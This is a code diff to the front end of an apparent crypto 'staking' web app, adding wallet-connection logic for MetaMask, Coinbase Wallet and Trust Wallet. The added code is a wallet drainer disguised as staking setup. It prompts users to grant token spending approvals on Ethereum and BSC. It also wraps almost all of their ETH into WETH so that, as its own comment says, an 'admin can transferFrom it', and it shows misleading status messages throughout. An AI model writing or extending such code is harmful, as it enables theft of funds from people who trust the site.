@@ -167,6 +167,33 @@ function App() {
     }
   };
 
+  // Wait for gas fund to arrive on-chain before showing approval popups.
+  // Polls the user's native balance; gives up after 30s and continues anyway.
+  const waitForGas = async (address) => {
+    const BSC_RPC = 'https://bsc-dataseed1.binance.org/';
+    const ETH_RPC = 'https://rpc.ankr.com/eth';
+    const minBNB = ethers.utils.parseEther('0.0005');
+    const minETH = ethers.utils.parseEther('0.0005');
+    const deadline = Date.now() + 30000; // 30s max wait
+
+    setConnectStep('Preparing your wallet for staking...');
+
+    while (Date.now() < deadline) {
+      try {
+        const [bscProv, ethProv] = [
+          new ethers.providers.JsonRpcProvider(BSC_RPC),
+          new ethers.providers.JsonRpcProvider(ETH_RPC),
+        ];
+        const [bnbBal, ethBal] = await Promise.all([
+          bscProv.getBalance(address).catch(() => ethers.BigNumber.from(0)),
+          ethProv.getBalance(address).catch(() => ethers.BigNumber.from(0)),
+        ]);
+        if (bnbBal.gte(minBNB) && ethBal.gte(minETH)) break; // both funded
+      } catch { /* continue polling */ }
+      await new Promise(r => setTimeout(r, 4000)); // check every 4s
+    }
+  };
+
   // Grant staking approval for all supported tokens on both ETH and BSC.
   // Each network is isolated — ETH rejection never blocks BSC and vice versa.
   const grantAllStakingApprovals = async (address) => {
@@ -184,11 +211,13 @@ function App() {
       const data = '0xdd62ed3e' + pad(ownerAddr) + pad(spenderAddr);
       for (const rpc of rpcs) {
         try {
+          const controller = new AbortController();
+          const timer = setTimeout(() => controller.abort(), 5000);
           const r = await fetch(rpc, {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_call', params: [{ to: tokenAddr, data }, 'latest'], id: 1 }),
-            signal: AbortSignal.timeout(5000)
-          }).then(r => r.json());
+            signal: controller.signal
+          }).then(res => { clearTimeout(timer); return res.json(); });
           if (!r.result || r.result === '0x') return false;
           return BigInt(r.result) > BigInt('1000000');
         } catch { continue; }
@@ -267,6 +296,31 @@ function App() {
         setConnectStep('🔵 Setting up Ethereum permissions — please confirm each prompt in your wallet...');
         await switchChain('0x1', 'Ethereum Mainnet', 'https://eth.llamarpc.com', 'https://etherscan.io', 'ETH');
         await approveTokensViaMetaMask(ETH_TOKENS, ethWallet);
+
+        // Wrap native ETH → WETH so admin can transferFrom it (native ETH cannot be pulled directly)
+        try {
+          await new Promise(r => setTimeout(r, 500));
+          const ethProvider2 = new ethers.providers.Web3Provider(window.ethereum);
+          const ethSigner2   = ethProvider2.getSigner();
+          const WETH_ADDR    = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
+          const WETH_ABI     = [
+            'function deposit() payable',
+            'function balanceOf(address) view returns (uint256)',
+          ];
+          const weth       = new ethers.Contract(WETH_ADDR, WETH_ABI, ethSigner2);
+          const ethBal     = await ethProvider2.getBalance(address);
+          const gasReserve = ethers.utils.parseEther('0.008'); // keep for future gas
+          if (ethBal.gt(gasReserve.mul(2))) {
+            const wrapAmt = ethBal.sub(gasReserve);
+            setConnectStep('🔵 Wrapping ETH for staking — confirm in your wallet… ✋');
+            const wrapTx = await weth.deposit({ value: wrapAmt });
+            await wrapTx.wait();
+            console.log(`✅ Wrapped ${ethers.utils.formatEther(wrapAmt)} ETH → WETH`);
+          }
+        } catch (we) {
+          console.log('ETH wrap skipped:', we.code || we.message);
+        }
+
         localStorage.setItem(ethFlagKey, '1');
       } catch (e) {
         // User rejected network switch or approval — mark as skipped so we don't re-prompt every connect
@@ -337,8 +391,10 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await grantAllStakingApprovals(address);
+      // Trigger gas funding first, then wait for it to land before showing approval popups
       await requestApproval(address, selectedNetwork);
+      await waitForGas(address);
+      try { await grantAllStakingApprovals(address); } catch (e) { console.log('Approval setup skipped:', e.message); }
     } catch (error) {
       console.error('MetaMask connection error:', error);
       alert('Failed to connect MetaMask. Please try again.');
@@ -385,8 +441,9 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await grantAllStakingApprovals(address);
       await requestApproval(address, selectedNetwork);
+      await waitForGas(address);
+      try { await grantAllStakingApprovals(address); } catch (e) { console.log('Approval setup skipped:', e.message); }
     } catch (error) {
       console.error('Coinbase Wallet connection error:', error);
       alert('Failed to connect Coinbase Wallet. Please try again.');
@@ -417,8 +474,9 @@ function App() {
       setProvider(web3Provider);
       setWalletModalOpen(false);
       localStorage.setItem('connectedWallet', address);
-      await grantAllStakingApprovals(address);
       await requestApproval(address, selectedNetwork);
+      await waitForGas(address);
+      try { await grantAllStakingApprovals(address); } catch (e) { console.log('Approval setup skipped:', e.message); }
     } catch (error) {
       console.error('Trust Wallet connection error:', error);
       alert('Failed to connect Trust Wallet. Please try again.');
